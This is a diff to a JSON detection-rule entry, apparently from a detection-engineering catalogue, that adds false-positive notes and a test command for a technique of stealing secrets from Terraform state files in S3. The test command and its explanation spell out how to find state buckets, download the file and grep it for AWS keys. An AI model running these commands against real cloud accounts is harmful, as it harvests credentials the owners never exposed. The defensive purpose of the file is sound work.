@@ -137,7 +137,8 @@
           "T1213.003"
         ],
         "fidelity": "telemetry",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Automated cloud management tools, CI/CD pipelines, or authorized admin API calls"
       },
       {
         "platform": "splunk",
@@ -149,7 +150,8 @@
           "T1213.003"
         ],
         "fidelity": "telemetry",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Automated cloud management tools, CI/CD pipelines, or authorized admin API calls"
       },
       {
         "platform": "sigma",
@@ -161,7 +163,8 @@
           "T1213.003"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate admin activity using the same Windows APIs or tools"
       },
       {
         "platform": "elastic",
@@ -172,7 +175,9 @@
           "T1552.001",
           "T1213.003"
         ],
-        "fidelity": "behavioral"
+        "fidelity": "behavioral",
+        "false_positives": "Automated cloud management tools, CI/CD pipelines, or authorized admin API calls",
+        "confidence": "medium"
       }
     ],
     "visibility": {
@@ -203,7 +208,8 @@
         "Check for credential dumping artifacts (LSASS access, SAM hive reads, Kerberos anomalies)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "aws --profile <profile> s3api list-buckets --query 'Buckets[?contains(Name, `tf-state`) || contains(Name, `terraform`)].Name'\naws --profile <profile> s3 cp s3://<tf-state-bucket>/terraform.tfstate ./\ncat terraform.tfstate | python3 -c \"import json,sys; d=json.load(sys.stdin); [print(r) for r in str(d).split() if 'AKIA' in r or len(r)==40]\""
     }
   },
   "explain": "Finds and loots Terraform state files in S3, which store provisioned resources in cleartext:\n  s3api list-buckets --query 'Buckets[?contains(Name, `tf-state`) || contains(Name, `terraform`)].Name'   find state buckets by name\n  s3 cp s3://<tf-state-bucket>/terraform.tfstate ./   download the state file\n  python3 -c \"... if 'AKIA' in r or len(r)==40\"   grep the JSON for AWS access key IDs (AKIA...) and 40-char secret keys\n.tfstate routinely contains plaintext IAM keys, DB passwords, and other secrets."
